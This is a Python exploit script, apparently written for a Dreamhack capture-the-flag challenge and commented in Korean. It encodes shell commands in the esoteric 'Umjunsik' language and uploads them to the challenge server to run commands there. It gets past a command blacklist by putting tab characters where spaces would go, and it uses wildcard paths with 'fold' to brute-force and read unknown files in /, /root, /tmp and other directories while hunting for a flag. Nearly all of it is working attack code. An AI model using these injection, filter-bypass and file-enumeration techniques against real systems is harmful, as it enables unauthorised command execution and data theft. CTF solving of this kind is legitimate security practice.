#!/usr/bin/env python3
"""
모든 길이 빠르게 스캔
"""
import requests
import os
import tempfile
import re

SERVER_URL = "http://host8.dreamhack.games:18862/umm"
TAB = '\t'

def generate_umjunsik(command):
    lines = ['어떻게']
    for char in command:
        ascii_val = ord(char)
        dots = '.' * ascii_val
        lines.append(f'식{dots}ㅋ')
    lines.append('이 사람이름이냐ㅋㅋ')
    return '\n'.join(lines)

def try_cmd(command):
    payload = generate_umjunsik(command)
    temp_file = os.path.join(tempfile.gettempdir(), 'temp_payload.umm')
    
    with open(temp_file, 'w', encoding='utf-8') as f:
        f.write(payload)
    
    try:
        with open(temp_file, 'rb') as f:
            files = {'file': ('payload.umm', f.read(), 'application/octet-stream')}
        
        response = requests.post(SERVER_URL, files=files, timeout=10)
        os.remove(temp_file)
        
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

print("="*70)
print("🔍 빠른 스캔 - 모든 길이 확인")
print("="*70)

# 루트 디렉토리 1-20글자
print("\n[루트 디렉토리 /]")
print("-"*70)

for length in range(1, 21):
    cmd = f'fold{TAB}/{"?"*length}'
    result = try_cmd(cmd)
    
    if result:
        exec_result = result.get('execution_result', '')
        exec_error = result.get('execution_error', '')
        
        if exec_result or (exec_error and 'No such file' not in exec_error and 'Is a directory' not in exec_error):
            print(f"✅ /{length}글자: 파일 발견!")
            
            if exec_result:
                print(f"   내용: {exec_result[:100]}...")
            
            # FLAG 체크
            if 'DH{' in exec_result + exec_error:
                print("\n" + "🎉"*35)
                print("🎉🎉🎉 FLAG FOUND! 🎉🎉🎉")
                print("🎉"*35)
                flags = re.findall(r'DH\{[^}]+\}', exec_result + exec_error)
                for flag in flags:
                    print(f"\n🚩 {flag}")
                exit(0)
        else:
            print(f"⚪ /{length}글자: 없음")
    else:
        print(f"❌ /{length}글자: 블랙리스트")

# 현재 디렉토리도 확인
print("\n[현재 디렉토리 (상위 = /)]")
print("-"*70)

for length in range(1, 21):
    cmd = f'fold{TAB}{"?"*length}'
    result = try_cmd(cmd)
    
    if result:
        exec_result = result.get('execution_result', '')
        exec_error = result.get('execution_error', '')
        
        if exec_result or (exec_error and 'No such file' not in exec_error and 'Is a directory' not in exec_error):
            print(f"✅ {length}글자: 파일 발견!")
            
            if exec_result:
                print(f"   내용: {exec_result[:100]}...")
            
            # FLAG 체크
            if 'DH{' in exec_result + exec_error:
                print("\n" + "🎉"*35)
                print("🎉🎉🎉 FLAG FOUND! 🎉🎉🎉")
                print("🎉"*35)
                flags = re.findall(r'DH\{[^}]+\}', exec_result + exec_error)
                for flag in flags:
                    print(f"\n🚩 {flag}")
                exit(0)
        else:
            print(f"⚪ {length}글자: 없음")

# 상대 경로는 . 때문에 안됨
# 하지만 혹시 모르니 다른 경로들도
print("\n[기타 경로]")
print("-"*70)

other_paths = [
    '/tmp',
    '/root', 
    '/home',
    '/opt',
    '/var',
]

for base_path in other_paths:
    print(f"\n{base_path}:")
    for length in [4, 5, 6, 7, 8, 9, 10]:
        cmd = f'fold{TAB}{base_path}/{"?"*length}'
        result = try_cmd(cmd)
        
        if result:
            exec_result = result.get('execution_result', '')
            exec_error = result.get('execution_error', '')
            
            if exec_result and 'DH{' in exec_result:
                print(f"✅ {base_path}/{length}글자: FLAG!")
                flags = re.findall(r'DH\{[^}]+\}', exec_result)
                for flag in flags:
                    print(f"🚩 {flag}")
                exit(0)

print("\n" + "="*70)
print("⚠️  Flag를 찾지 못했습니다.")
print("="*70)